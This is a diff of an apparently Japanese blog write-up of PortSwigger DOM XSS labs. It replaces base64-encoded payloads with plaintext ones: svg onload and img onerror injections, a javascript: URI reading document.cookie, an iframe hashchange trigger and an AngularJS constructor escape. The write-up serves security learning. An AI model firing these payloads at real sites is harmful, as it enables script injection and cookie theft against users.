@@ -24,12 +24,10 @@ tags = ["PortSwigger", "Writeup", "Web", "XSS", "DOM"]
   - location.search -> *"?x=1"*
   - location.hash -> *"#section1"*
 
-> ＊ ブログサイトの都合上 xss ペイロード関連の文字列は base64 でエンコードしています。
-
 ## Lab
 ### DOM XSS in document.write sink using source location.search
 ```text
-R0VUIC8/c2VhcmNoPSI+PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
+GET /?search="><svg onload=alert(1)>
 ```
 ```html
 <script>
@@ -45,7 +43,7 @@ R0VUIC8/c2VhcmNoPSI+PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
 
 ### DOM XSS in innerHTML sink using source location.search
 ```text
-R0VUIC8/c2VhcmNoPTxzdmcgb25sb2FkPWFsZXJ0KDEpPg==
+GET /?search=<svg onload=alert(1)>
 ```
 ```html
 <script>
@@ -61,8 +59,9 @@ R0VUIC8/c2VhcmNoPTxzdmcgb25sb2FkPWFsZXJ0KDEpPg==
 
 ### DOM XSS in jQuery anchor href attribute sink using location.search source
 > View Page Source や Burp はブラウザ内で JavaScript によって行われた DOM の変更（href の書き換え）は確認できない。一方 Inspect では、JavaScript 実行後の DOM を確認できるため、href 属性が変更されていることが分かる。
+
 ```text
-R0VUIC9mZWVkYmFjaz9yZXR1cm5QYXRoPWphdmFzY3JpcHQ6YWxlcnQoZG9jdW1lbnQuY29va2llKQ==
+GET /feedback?returnPath=javascript:alert(document.cookie)
 ```
 ```html
 <script src="/resources/js/jquery_1-8-2.js"></script>
@@ -76,8 +75,9 @@ R0VUIC9mZWVkYmFjaz9yZXR1cm5QYXRoPWphdmFzY3JpcHQ6YWxlcnQoZG9jdW1lbnQuY29va2llKQ==
 ### DOM XSS in jQuery selector sink using a hashchange event
 > #以降が$()に読み込まれる  
 `<svg onload>`はうまく発火しなかった
+
 ```text
-PGlmcmFtZSBzcmM9Imh0dHBzOi8vY2hhbGxlbmdlLWhvc3QvIyIgb25sb2FkPSJ0aGlzLnNyYys9JzxpbWcgc3JjPXggb25lcnJvcj1wcmludCgpPiciPjwvaWZyYW1lPg==
+<iframe src="https://challenge-host/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
 ```
 ```html
 <script src="/resources/js/jquery_1-8-2.js"></script>
@@ -92,8 +92,9 @@ PGlmcmFtZSBzcmM9Imh0dHBzOi8vY2hhbGxlbmdlLWhvc3QvIyIgb25sb2FkPSJ0aGlzLnNyYys9Jzxp
 
 ### DOM XSS in document.write sink using source location.search inside a select element
 > location.search で storedId を読み込んでいるので URL に追加する
+
 ```text
-R0VUIC9wcm9kdWN0P3Byb2R1Y3RJZD0yJnN0b3JlSWQ9PHN2ZyUyMG9ubG9hZD1hbGVydCgxKT4=
+GET /product?productId=2&storeId=<svg%20onload=alert(1)>
 ```
 ```html
 <script>
@@ -115,7 +116,7 @@ R0VUIC9wcm9kdWN0P3Byb2R1Y3RJZD0yJnN0b3JlSWQ9PHN2ZyUyMG9ubG9hZD1hbGVydCgxKT4=
 
 ### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
 ```text
-R0VUIC8/c2VhcmNoPXt7JG9uLmNvbnN0cnVjdG9yKCdhbGVydCgxKScpKCl9fQ==
+GET /?search={{$on.constructor('alert(1)')()}}
 ```
 ```html
 <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
